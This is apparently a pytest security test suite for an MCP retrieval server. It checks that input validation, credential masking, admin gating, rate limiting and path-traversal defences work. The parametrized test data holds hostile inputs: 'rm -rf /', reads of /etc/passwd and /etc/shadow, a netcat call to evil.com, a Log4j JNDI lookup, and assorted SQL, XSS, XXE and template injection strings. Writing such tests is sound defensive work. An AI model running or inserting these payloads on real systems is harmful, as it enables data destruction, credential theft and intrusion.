"""
Comprehensive security test suite for MCP server implementation.
Tests for injection attacks, credential exposure, and security vulnerabilities.
"""

import pytest
import asyncio
import os
import json
import hashlib
from unittest.mock import patch, MagicMock, AsyncMock
from pathlib import Path
import tempfile
import httpx
from typing import Dict, Any, List

# Import components to test
import sys
sys.path.insert(0, str(Path(__file__).parent.parent))

from mcprag.config import Config
from mcprag.server import MCPServer
from mcprag.mcp.tools._helpers.input_validation import (
    validate_query, validate_max_results, validate_language
)


class TestInputValidation:
    """Test input validation against various attack vectors."""
    
    @pytest.mark.parametrize("malicious_input,attack_type", [
        # SQL Injection attempts
        ("' OR '1'='1", "sql_injection"),
        ("1; DROP TABLE users--", "sql_injection"),
        ("admin'--", "sql_injection"),
        ("' UNION SELECT * FROM passwords--", "sql_injection"),
        
        # Command Injection attempts
        ("test; rm -rf /", "command_injection"),
        ("$(cat /etc/passwd)", "command_injection"),
        ("`ls -la`", "command_injection"),
        ("test && cat /etc/shadow", "command_injection"),
        ("| nc evil.com 4444", "command_injection"),
        
        # Path Traversal attempts
        ("../../../etc/passwd", "path_traversal"),
        ("..\\..\\..\\windows\\system32\\config\\sam", "path_traversal"),
        ("file:///etc/passwd", "path_traversal"),
        
        # XSS attempts
        ("<script>alert('XSS')</script>", "xss"),
        ("javascript:alert(1)", "xss"),
        ("<img src=x onerror=alert(1)>", "xss"),
        ("<svg onload=alert(1)>", "xss"),
        
        # LDAP Injection
        ("*)(uid=*", "ldap_injection"),
        ("admin)(|(password=*)", "ldap_injection"),
        
        # NoSQL Injection
        ('{"$ne": null}', "nosql_injection"),
        ('{"$gt": ""}', "nosql_injection"),
        
        # OData Injection for Azure Search
        ("') or (true", "odata_injection"),
        ("' or '1' eq '1", "odata_injection"),
        
        # Server-Side Template Injection
        ("{{7*7}}", "template_injection"),
        ("${7*7}", "template_injection"),
        ("<%= 7*7 %>", "template_injection"),
        
        # XXE attempts
        ('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', "xxe"),
        
        # Log Injection
        ("test\nERROR: Fake error", "log_injection"),
        ("test\r\nINFO: Injected log", "log_injection"),
    ])
    async def test_query_validation_blocks_attacks(self, malicious_input: str, attack_type: str):
        """Test that malicious queries are properly validated and sanitized."""
        is_valid, error, sanitized = validate_query(malicious_input)
        
        # The validation should either reject the input or sanitize it
        if is_valid:
            # If accepted, ensure it's been sanitized
            assert sanitized != malicious_input, f"Failed to sanitize {attack_type} attempt"
            # Check that dangerous patterns are removed
            dangerous_patterns = ["'", '"', ";", "--", "../", "\\", "<", ">", "$", "`", "|", "&"]
            for pattern in dangerous_patterns:
                if pattern in malicious_input:
                    assert pattern not in sanitized or sanitized.count(pattern) < malicious_input.count(pattern)
    
    @pytest.mark.parametrize("repository_path", [
        "/etc/passwd",
        "C:\\Windows\\System32",
        "../../sensitive/data",
        "/root/.ssh",
        "~/.aws/credentials",
    ])
    async def test_repository_path_validation(self, repository_path: str):
        """Test that repository paths are validated for traversal attacks."""
        from enhanced_rag.azure_integration.automation.cli_manager import CLIAutomation
        
        cli = CLIAutomation(MagicMock())
        
        # Should raise or sanitize dangerous paths
        with pytest.raises((ValueError, PermissionError)):
            await cli.process_repository(repository_path, "test-repo")
    
    async def test_odata_filter_injection_prevention(self):
        """Test that OData filters are properly escaped."""
        from enhanced_rag.retrieval.multi_stage_pipeline import MultiStageRetriever
        
        retriever = MultiStageRetriever({})
        
        # Create a query with injection attempt
        from enhanced_rag.core.models import SearchQuery, SearchIntent
        query = SearchQuery(
            query="test' or '1' eq '1",
            intent=SearchIntent.IMPLEMENT,
            language="python' or true or '",
            framework="django') or (1 eq 1",
        )
        
        filter_expr = retriever._build_filter(query)
        
        # Ensure single quotes are escaped
        assert "'" not in filter_expr or "''" in filter_expr
        # Ensure the filter is properly formatted
        assert " or '1' eq '1" not in filter_expr


class TestCredentialSecurity:
    """Test credential handling and exposure prevention."""
    
    async def test_credentials_not_in_logs(self, caplog):
        """Ensure credentials are never logged."""
        test_key = "super_secret_admin_key_12345"
        test_endpoint = "https://mysearch.search.windows.net"
        
        with patch.dict(os.environ, {
            'ACS_ADMIN_KEY': test_key,
            'ACS_ENDPOINT': test_endpoint,
            'AZURE_OPENAI_KEY': 'openai_secret_key',
        }):
            # Initialize server
            server = MCPServer()
            
            # Check all log records
            for record in caplog.records:
                message = record.getMessage()
                assert test_key not in message, f"Admin key found in log: {message}"
                assert 'openai_secret_key' not in message, f"OpenAI key found in log: {message}"
                # Allow endpoint URL but not with credentials
                if test_endpoint in message:
                    assert test_key not in message
    
    async def test_credentials_not_in_error_messages(self):
        """Test that credentials don't appear in error messages."""
        test_key = "secret_api_key_xyz"
        
        with patch.dict(os.environ, {'ACS_ADMIN_KEY': test_key}):
            from enhanced_rag.azure_integration.rest.client import AzureSearchClient
            
            client = AzureSearchClient(
                endpoint="https://invalid.search.windows.net",
                api_key=test_key
            )
            
            # Force an error
            try:
                await client.request("GET", "/invalid")
            except Exception as e:
                error_str = str(e)
                assert test_key not in error_str, f"API key exposed in error: {error_str}"
    
    async def test_credentials_masked_in_config_dump(self):
        """Test that credentials are masked when config is serialized."""
        with patch.dict(os.environ, {
            'ACS_ADMIN_KEY': 'secret123',
            'AZURE_OPENAI_KEY': 'openai456',
        }):
            config = Config.get_rag_config()
            
            # Serialize config
            config_str = json.dumps(config, default=str)
            
            # Credentials should be masked or not included
            assert 'secret123' not in config_str
            assert 'openai456' not in config_str


class TestAuthorizationAndAccess:
    """Test authorization and access control."""
    
    async def test_admin_mode_required_for_destructive_operations(self):
        """Test that destructive operations require admin mode."""
        with patch.dict(os.environ, {'MCP_ADMIN_MODE': 'false'}):
            from mcprag.mcp.tools.admin import require_admin_mode
            
            @require_admin_mode
            async def dangerous_operation():
                return {"success": True}
            
            # Should be blocked without admin mode
            result = await dangerous_operation()
            assert not result.get('ok', False)
            assert 'admin mode' in result.get('error', '').lower()
    
    async def test_confirmation_required_for_index_rebuild(self):
        """Test that index rebuild requires explicit confirmation."""
        from mcprag.mcp.tools.admin import require_confirmation
        
        @require_confirmation
        async def rebuild_index(confirm: bool = False):
            return {"rebuilt": True}
        
        # Without confirmation
        result = await rebuild_index(confirm=False)
        assert 'confirmation required' in str(result).lower()
        
        # With confirmation
        result = await rebuild_index(confirm=True)
        assert result.get('rebuilt') == True


class TestErrorHandling:
    """Test error handling doesn't expose sensitive information."""
    
    async def test_stack_traces_sanitized(self):
        """Test that stack traces don't expose sensitive paths."""
        from enhanced_rag.utils.error_handler import ErrorHandler
        
        handler = ErrorHandler()
        
        # Create an error with sensitive information
        try:
            # Simulate an error with file paths
            raise ValueError(f"Failed to process /home/user/secret/data/passwords.txt")
        except Exception as e:
            safe_error = handler.format_error(e)
            
            # Should not contain actual file paths
            assert "/home/user/secret" not in safe_error
            assert "passwords.txt" not in safe_error
    
    async def test_database_errors_sanitized(self):
        """Test that database errors don't expose schema."""
        error_message = "Column 'user_passwords' in table 'auth_users' cannot be null"
        
        from enhanced_rag.utils.error_handler import sanitize_error
        
        safe_message = sanitize_error(error_message)
        
        # Should not expose table/column names
        assert 'user_passwords' not in safe_message
        assert 'auth_users' not in safe_message


class TestRateLimiting:
    """Test rate limiting and DoS prevention."""
    
    async def test_search_rate_limiting(self):
        """Test that search operations are rate limited."""
        from mcprag.mcp.utils.rate_limiter import RateLimiter
        
        limiter = RateLimiter(max_calls=5, time_window=1.0)
        
        call_count = 0
        
        @limiter.check
        async def search_operation():
            nonlocal call_count
            call_count += 1
            return {"result": "success"}
        
        # First 5 calls should succeed
        for i in range(5):
            result = await search_operation()
            assert result["result"] == "success"
        
        # 6th call should be rate limited
        with pytest.raises(Exception) as exc_info:
            await search_operation()
        assert "rate limit" in str(exc_info.value).lower()
        
        assert call_count == 5
    
    async def test_concurrent_request_limiting(self):
        """Test that concurrent requests are limited."""
        from asyncio import Semaphore
        
        max_concurrent = 10
        semaphore = Semaphore(max_concurrent)
        
        active_count = 0
        max_active = 0
        
        async def limited_operation():
            nonlocal active_count, max_active
            async with semaphore:
                active_count += 1
                max_active = max(max_active, active_count)
                await asyncio.sleep(0.1)
                active_count -= 1
        
        # Try to run 50 concurrent operations
        tasks = [limited_operation() for _ in range(50)]
        await asyncio.gather(*tasks)
        
        # Should never exceed max_concurrent
        assert max_active <= max_concurrent


class TestEncryption:
    """Test encryption of sensitive data."""
    
    async def test_cache_data_encrypted(self):
        """Test that cached embeddings are encrypted."""
        from enhanced_rag.azure_integration.automation.embedding_manager import EmbeddingAutomation
        
        # Mock the cache to inspect stored values
        with patch('enhanced_rag.azure_integration.automation.embedding_manager.EmbeddingCache') as MockCache:
            cache_instance = MagicMock()
            MockCache.return_value = cache_instance
            
            manager = EmbeddingAutomation(MagicMock())
            
            # Generate embeddings
            texts = ["sensitive code snippet"]
            embeddings = await manager.generate_embeddings(texts)
            
            # Check that cached values are not plain text
            if cache_instance.set.called:
                cached_value = cache_instance.set.call_args[0][1]
                # Should not be able to find the original text in cached value
                assert "sensitive code snippet" not in str(cached_value)


class TestFileSystemSecurity:
    """Test file system access security."""
    
    async def test_path_traversal_prevention(self):
        """Test that path traversal attacks are prevented."""
        from enhanced_rag.azure_integration.automation.cli_manager import CLIAutomation
        
        with tempfile.TemporaryDirectory() as tmpdir:
            safe_dir = Path(tmpdir) / "safe"
            safe_dir.mkdir()
            
            # Create a file outside the safe directory
            secret_file = Path(tmpdir) / "secret.txt"
            secret_file.write_text("secret data")
            
            cli = CLIAutomation(MagicMock())
            
            # Try to access parent directory
            with pytest.raises((ValueError, PermissionError)):
                await cli.process_file(str(safe_dir / ".." / "secret.txt"))
    
    async def test_symlink_attack_prevention(self):
        """Test that symlink attacks are prevented."""
        with tempfile.TemporaryDirectory() as tmpdir:
            safe_dir = Path(tmpdir) / "repo"
            safe_dir.mkdir()
            
            # Create a symlink to /etc/passwd
            if os.name != 'nt':  # Skip on Windows
                symlink = safe_dir / "passwd"
                try:
                    symlink.symlink_to("/etc/passwd")
                    
                    from enhanced_rag.azure_integration.automation.cli_manager import CLIAutomation
                    cli = CLIAutomation(MagicMock())
                    
                    # Should not follow symlinks outside repo
                    files = await cli.discover_files(str(safe_dir))
                    
                    # Should not include the symlink target
                    assert not any("/etc/passwd" in str(f) for f in files)
                except OSError:
                    pytest.skip("Cannot create symlinks")


class TestNetworkSecurity:
    """Test network security measures."""
    
    async def test_ssl_verification_enabled(self):
        """Test that SSL verification is enabled for external calls."""
        from enhanced_rag.azure_integration.rest.client import AzureSearchClient
        
        client = AzureSearchClient(
            endpoint="https://test.search.windows.net",
            api_key="test"
        )
        
        # Check that SSL verification is not disabled
        assert client.client.verify is not False
    
    async def test_request_timeout_configured(self):
        """Test that requests have appropriate timeouts."""
        from enhanced_rag.azure_integration.rest.client import AzureSearchClient
        
        client = AzureSearchClient(
            endpoint="https://test.search.windows.net",
            api_key="test"
        )
        
        # Should have a reasonable timeout
        assert client.timeout is not None
        assert client.timeout <= 60  # Max 60 seconds
    
    async def test_no_redirect_following_by_default(self):
        """Test that redirects are not automatically followed."""
        from enhanced_rag.azure_integration.rest.client import AzureSearchClient
        
        client = AzureSearchClient(
            endpoint="https://test.search.windows.net",
            api_key="test"
        )
        
        # Should not follow redirects by default (security risk)
        assert client.client.follow_redirects == False


class TestConcurrencySafety:
    """Test thread and async safety."""
    
    async def test_cache_thread_safety(self):
        """Test that cache operations are thread-safe."""
        from enhanced_rag.utils.cache_manager import CacheManager
        import threading
        
        cache = CacheManager(ttl=60, max_size=100)
        errors = []
        
        def concurrent_access():
            try:
                for i in range(100):
                    cache.set(f"key_{i}", f"value_{i}")
                    cache.get(f"key_{i}")
            except Exception as e:
                errors.append(e)
        
        # Run multiple threads
        threads = [threading.Thread(target=concurrent_access) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        
        # Should not have any errors
        assert len(errors) == 0
    
    async def test_async_cleanup_safety(self):
        """Test that async cleanup is safe."""
        server = MCPServer()
        
        # Start and cleanup multiple times
        for _ in range(3):
            await server.start_async_components()
            await server.cleanup_async_components()
        
        # Should not raise any errors or leave resources


class TestDataValidation:
    """Test data validation and sanitization."""
    
    @pytest.mark.parametrize("embedding_dim", [
        -1, 0, 3073, 10000, float('inf'), float('nan')
    ])
    async def test_invalid_embedding_dimensions(self, embedding_dim):
        """Test that invalid embedding dimensions are rejected."""
        from enhanced_rag.azure_integration.automation.embedding_manager import validate_embedding_dimension
        
        with pytest.raises(ValueError):
            validate_embedding_dimension(embedding_dim)
    
    async def test_document_size_limits(self):
        """Test that oversized documents are handled."""
        from enhanced_rag.azure_integration.automation.data_manager import DataAutomation
        
        # Create a document that exceeds Azure's limit (32KB for string fields)
        huge_content = "x" * (32 * 1024 + 1)
        
        doc = {
            "id": "test",
            "content": huge_content
        }
        
        data_mgr = DataAutomation(MagicMock())
        
        # Should either truncate or reject
        processed = data_mgr._validate_document(doc)
        
        if processed:
            assert len(processed.get("content", "")) <= 32 * 1024


class TestAuditLogging:
    """Test audit logging for security events."""
    
    async def test_admin_operations_logged(self, caplog):
        """Test that admin operations are logged."""
        import logging
        logging.getLogger().setLevel(logging.INFO)
        
        with patch.dict(os.environ, {'MCP_ADMIN_MODE': 'true'}):
            from mcprag.mcp.tools.admin import index_rebuild
            
            # Mock the server
            mock_server = MagicMock()
            mock_server.indexer_automation = MagicMock()
            
            await index_rebuild(mock_server, confirm=True)
            
            # Should log the admin operation
            admin_logs = [r for r in caplog.records if 'admin' in r.getMessage().lower()]
            assert len(admin_logs) > 0
    
    async def test_failed_auth_attempts_logged(self, caplog):
        """Test that failed authentication attempts are logged."""
        from enhanced_rag.azure_integration.rest.client import AzureSearchClient
        
        # Use invalid credentials
        client = AzureSearchClient(
            endpoint="https://test.search.windows.net",
            api_key="invalid_key"
        )
        
        with patch.object(client.client, 'request', side_effect=httpx.HTTPStatusError(
            "401 Unauthorized", request=MagicMock(), response=MagicMock(status_code=401)
        )):
            try:
                await client.request("GET", "/indexes")
            except:
                pass
        
        # Should log the failed auth
        auth_failures = [r for r in caplog.records if '401' in r.getMessage() or 'unauthorized' in r.getMessage().lower()]
        assert len(auth_failures) > 0


# Fuzzing tests
class TestFuzzing:
    """Fuzz testing for input validation."""
    
    @pytest.mark.parametrize("fuzz_input", [
        b"\x00\x01\x02\x03",  # Binary data
        "A" * 10000,  # Very long string
        "\n" * 100,  # Many newlines
        "💣" * 100,  # Unicode bombs
        "%s" * 100,  # Format string
        "${jndi:ldap://evil.com/a}",  # Log4j attack
        "\\x00\\x00",  # Null bytes
        "\r\n" * 50,  # CRLF injection
    ])
    async def test_fuzz_query_input(self, fuzz_input):
        """Fuzz test query validation."""
        from mcprag.mcp.tools._helpers.input_validation import validate_query
        
        # Should not crash
        try:
            if isinstance(fuzz_input, bytes):
                fuzz_input = fuzz_input.decode('utf-8', errors='ignore')
            is_valid, error, sanitized = validate_query(fuzz_input)
            # Should either reject or sanitize
            assert not is_valid or len(sanitized) <= 1000
        except Exception as e:
            # Should handle gracefully
            assert "Internal error" not in str(e)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--asyncio-mode=auto"])